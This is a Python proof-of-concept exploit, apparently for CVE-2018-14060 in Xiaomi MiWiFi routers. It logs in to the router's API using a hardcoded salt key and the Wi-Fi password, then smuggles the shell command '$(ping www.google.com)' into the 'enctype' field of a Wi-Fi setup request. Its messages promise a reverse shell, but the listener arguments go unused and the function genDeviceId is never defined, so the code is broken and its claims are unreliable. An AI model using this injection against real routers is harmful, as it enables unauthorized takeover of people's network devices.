#!/usr/local/bin/python
"""
CVE-2018-14060
CNVD-2018-04520  poc
Charles Jiang
"""
import sys
import pycurl
import StringIO
import urllib
import hashlib
import time
import random
import math
import json


def createnonce(mac):
	varType = 0
	varDeviceId = mac
	varTime = math.floor(time.time() / 1000)
	varRandom = math.floor(random.random() * 10000)
	return '_'.join([str(varType), varDeviceId, str(varTime), str(varRandom)])


def oldPwd(pwd, nonce):
	key = 'a2ffa5c9be07488bbb04a3a47d3c5f6a'
	sha1obj = hashlib.sha1()
	sha1obj.update(pwd + key)
	p = sha1obj.hexdigest()
	sha1obj1 = hashlib.sha1()
	sha1obj1.update(nonce+p)
	return sha1obj1.hexdigest()

def doLogin(ip,deviceId,pwd):
	url = "http://"+ip+"/cgi-bin/luci/api/xqsystem/login"
	nonce = createnonce(deviceId)
	print "deviceId is %s , password is %s" % (deviceId, pwd)
	post_data_dic = {"username":"admin" , 'password':oldPwd(pwd,nonce)  , 'logtype':'2' , 'nonce':nonce }
	crl = pycurl.Curl()
	crl.setopt(pycurl.VERBOSE,1)  
	crl.setopt(pycurl.FOLLOWLOCATION, 1)
	crl.setopt(pycurl.MAXREDIRS, 5)  
	# crl.setopt(pycurl.AUTOREFERER,1)  
	crl.setopt(pycurl.CONNECTTIMEOUT, 60)  
	crl.setopt(pycurl.TIMEOUT, 300)  
	# crl.setopt(pycurl.PROXY,proxy)  
	crl.setopt(pycurl.HTTPPROXYTUNNEL,1)  
	# crl.setopt(pycurl.NOSIGNAL, 1)  
	crl.fp = StringIO.StringIO()  
	# crl.setopt(pycurl.USERAGENT, "dhgu hoho")  
	# Option -d/--data <data>   HTTP POST data  
	crl.setopt(crl.POSTFIELDS,  urllib.urlencode(post_data_dic))  
	crl.setopt(pycurl.URL, url)  
	crl.setopt(crl.WRITEFUNCTION, crl.fp.write)  
	crl.perform()  
	result =  crl.fp.getvalue()
	r = json.loads(result)
	return r["token"]


def doSetApMod(ip,tok):
	url = "http://"+ip+"/cgi-bin/luci/;stok=" + tok + "/api/misystem/set_router_wifiap"
	post_data_dic = {"ssid":"exploit","enctype":"$(ping www.google.com)"}
	crl = pycurl.Curl()
	crl.setopt(pycurl.VERBOSE,1)  
	crl.setopt(pycurl.FOLLOWLOCATION, 1)
	crl.setopt(pycurl.MAXREDIRS, 5)  
	#crl.setopt(pycurl.AUTOREFERER,1)
	crl.setopt(pycurl.CONNECTTIMEOUT, 60)  
	crl.setopt(pycurl.TIMEOUT, 300)  
	#crl.setopt(pycurl.PROXY,proxy)  
	crl.setopt(pycurl.HTTPPROXYTUNNEL,1)  
	#crl.setopt(pycurl.NOSIGNAL, 1)  
	crl.fp = StringIO.StringIO() 
	crl.setopt(crl.POSTFIELDS,  urllib.urlencode(post_data_dic))  
	crl.setopt(pycurl.URL, url)  
	crl.setopt(crl.WRITEFUNCTION, crl.fp.write)  
	crl.perform()  
	print crl.fp.getvalue()
	return


def main():
	if len(sys.argv) != 5:
		print "exp.py wifipwd ipaddress  lip lport"
		return
	wifipwd = sys.argv[1]
	ip = sys.argv[2]
	lip = sys.argv[3]
	lport = sys.argv[4]
	print "[+]Please listen on lport vai nc or some tools like that first."
	print "[+]If exploit successful you will get a shell"
	print "[+]Try to gettoken vai wifi password %s ..." % wifipwd
	tok = doLogin(ip,genDeviceId(),wifipwd)
	time.sleep(2)
	print "[+]Token is %s " % tok
	time.sleep(2)
	print "[*]Exploiting..."
	doSetApMod(ip,tok)
	print "[+]You will get miwifi route shell on lport."


if __name__ == '__main__':
	main()
